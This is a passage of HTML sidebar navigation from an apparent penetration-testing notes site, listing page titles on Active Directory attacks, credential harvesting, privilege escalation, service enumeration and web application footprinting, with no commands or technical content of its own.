        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_5" >
        
          
          <label class="md-nav__link" for="__nav_3_1_5" id="__nav_3_1_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    04 PrivilegeEscalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_5">
            <span class="md-nav__icon md-icon"></span>
            04 PrivilegeEscalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../04-PrivilegeEscalation/LocalPrivilegeEscalation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    PrintSpoofer [https://github.com/itm4n/PrintSpoofer]
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_6" >
        
          
          <label class="md-nav__link" for="__nav_3_1_6" id="__nav_3_1_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    05 AdminAccessOnMachine
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_6">
            <span class="md-nav__icon md-icon"></span>
            05 AdminAccessOnMachine
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../05-AdminAccessOnMachine/AttackingLSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking LSA
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../05-AdminAccessOnMachine/AttackingSAM/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking SAM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../05-AdminAccessOnMachine/HarvestingTickets/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Harvesting Kerberos Tickets from Windows
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_7" >
        
          
          <label class="md-nav__link" for="__nav_3_1_7" id="__nav_3_1_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    06 LateralMovement
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_7">
            <span class="md-nav__icon md-icon"></span>
            06 LateralMovement
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../06-LateralMovement/ClearTextPassword/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cleartext password
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../06-LateralMovement/LateralMovement/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lateral Movement
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../06-LateralMovement/PassTheHash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Hash (PtH)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../06-LateralMovement/PassTheKeyorOverPassTheHash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Key or OverPass the Hash
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../06-LateralMovement/PassTheTicket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Ticket (PtT)
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_8" >
        
          
          <label class="md-nav__link" for="__nav_3_1_8" id="__nav_3_1_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    07 PermissionsMove
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_8">
            <span class="md-nav__icon md-icon"></span>
            07 PermissionsMove
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../07-PermissionsMove/AbsuingACL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ACL Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../07-PermissionsMove/DCSync/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DCSync
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_9" >
        
          
          <label class="md-nav__link" for="__nav_3_1_9" id="__nav_3_1_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    08 TrustRelationship
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_9">
            <span class="md-nav__icon md-icon"></span>
            08 TrustRelationship
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../08-TrustRelationship/AttackingDomainTrustsChildTrusts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking Domain Trusts - Child -&gt; Parent Trusts
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../08-TrustRelationship/CrossForestTrustAbuse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking Domain Trusts - Cross-Forest Trust Abuse
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../08-TrustRelationship/DomainTrusts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain Trusts
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_10" >
        
          
          <label class="md-nav__link" for="__nav_3_1_10" id="__nav_3_1_10_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    09 DomainAdmin
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_10">
            <span class="md-nav__icon md-icon"></span>
            09 DomainAdmin
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../09-DomainAdmin/DumpNTDS.dit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Dump NTDS.dit
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_1_11" >
        
          
          <label class="md-nav__link" for="__nav_3_1_11" id="__nav_3_1_11_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    10 Persistence
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_1_11_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_1_11">
            <span class="md-nav__icon md-icon"></span>
            10 Persistence
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../10-Persistence/GoldTicket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    GoldTicket
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../10-Persistence/SilverTicket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SilverTicket
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    BruteForce
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2">
            <span class="md-nav__icon md-icon"></span>
            BruteForce
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/BruteForce/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    BruteForce
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2_2" id="__nav_3_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CredentialHarvesting(u)
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_2">
            <span class="md-nav__icon md-icon"></span>
            CredentialHarvesting(u)
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_1" >
        
          
          <label class="md-nav__link" for="__nav_3_2_2_1" id="__nav_3_2_2_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    LinuxLocalPassword
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_2_1">
            <span class="md-nav__icon md-icon"></span>
            LinuxLocalPassword
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/CredentialHarvesting%28u%29/LinuxLocalPassword/CredentialHunting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credential Hunting in Linux
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_2" >
        
          
          <label class="md-nav__link" for="__nav_3_2_2_2" id="__nav_3_2_2_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    WindowsLateralMovement
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_2_2">
            <span class="md-nav__icon md-icon"></span>
            WindowsLateralMovement
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheHash/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Hash (PtH)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromLinux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Ticket (PtT) from Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/CredentialHarvesting%28u%29/WindowsLateralMovement/PassTheTicketFromWindows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pass the Ticket (PtT) from Windows
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2_2_3" >
        
          
          <label class="md-nav__link" for="__nav_3_2_2_3" id="__nav_3_2_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    WindowsLocalPassword
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_3_2_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_2_2_3">
            <span class="md-nav__icon md-icon"></span>
            WindowsLocalPassword
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingActiveDirectory%26NTDS.dit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking Active Directory &amp; NTDS.dit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingLSA/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking LSASS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/AttackingSAM/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking SAM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../BruteForce/CredentialHarvesting%28u%29/WindowsLocalPassword/CredentialHunting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credential Hunting in Windows
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
        
          
          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Enumeration
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3">
            <span class="md-nav__icon md-icon"></span>
            Enumeration
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3_1" >
        
          
          <label class="md-nav__link" for="__nav_3_3_1" id="__nav_3_3_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Discovery
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_3_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_3_1">
            <span class="md-nav__icon md-icon"></span>
            Discovery
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Enumeration/Discovery/Nmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nmap
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4" >
        
          
          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_4">
            <span class="md-nav__icon md-icon"></span>
            Metasploit
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Metasploit/Metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_5" >
        
          
          <label class="md-nav__link" for="__nav_3_5" id="__nav_3_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Pivoting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_5">
            <span class="md-nav__icon md-icon"></span>
            Pivoting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Pivoting/Pivoting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    delete
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_6" >
        
          
          <label class="md-nav__link" for="__nav_3_6" id="__nav_3_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PrivilegeEscalation
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_6">
            <span class="md-nav__icon md-icon"></span>
            PrivilegeEscalation
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../PrivilegeEscalation/Linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../PrivilegeEscalation/Windows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_7" >
        
          
          <label class="md-nav__link" for="__nav_3_7" id="__nav_3_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Services
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_7">
            <span class="md-nav__icon md-icon"></span>
            Services
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/DNS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/FTP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FTP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/IMAP-POP3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IMAP POP3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/IPMI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Footprinting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/NFS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NFS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/OracleTNS/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Footprinting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/RDP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RDP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/SMB/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SMB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/SMTP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SMTP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/SNMP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SNMP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/SQL/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/SSH/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSH
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/WINRM/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WINRM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Services/WMI/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Interacting
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_8" >
        
          
          <label class="md-nav__link" for="__nav_3_8" id="__nav_3_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Shell
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_8">
            <span class="md-nav__icon md-icon"></span>
            Shell
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Shell/Shell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shell
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_9" >
        
          
          <label class="md-nav__link" for="__nav_3_9" id="__nav_3_9_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    TransferFiles
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_9">
            <span class="md-nav__icon md-icon"></span>
            TransferFiles
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TransferFiles/FilesoverHTTP/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FilesoverHTTP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TransferFiles/Linux/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TransferFiles/LivingOffTheLand/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LivingOffTheLand
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TransferFiles/Miscellaneous/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Miscellaneous
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TransferFiles/ProtectFiles/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ProtectFiles
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TransferFiles/TransferFilesCode/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    TransferFilesCode
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../TransferFiles/Windows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10" >
        
          
          <label class="md-nav__link" for="__nav_3_10" id="__nav_3_10_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Web
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_10">
            <span class="md-nav__icon md-icon"></span>
            Web
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Checklist/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Checklist
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10_2" >
        
          
          <label class="md-nav__link" for="__nav_3_10_2" id="__nav_3_10_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Applications
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_10_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_10_2">
            <span class="md-nav__icon md-icon"></span>
            Applications
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/Drupal/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Discovery/Footprinting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/Gitlab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Footprinting &amp; Discovery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/Jenkins/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Discovery/Footprinting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/Joomla/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Discovery/Footprinting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/PRTGNetworkMonitor/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Discovery/Footprinting/Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/Splunk/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Discovery/Footprinting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/Tomcat/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Discovery/Footprinting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/WordPress/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Discovery/Footprinting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../Web/Applications/osTicket/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Footprinting/Discovery/Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_10_2_10" >
        
          
          <label class="md-nav__link" for="__nav_3_10_2_10" id="__nav_3_10_2_10_label" tabindex="0">
            
  
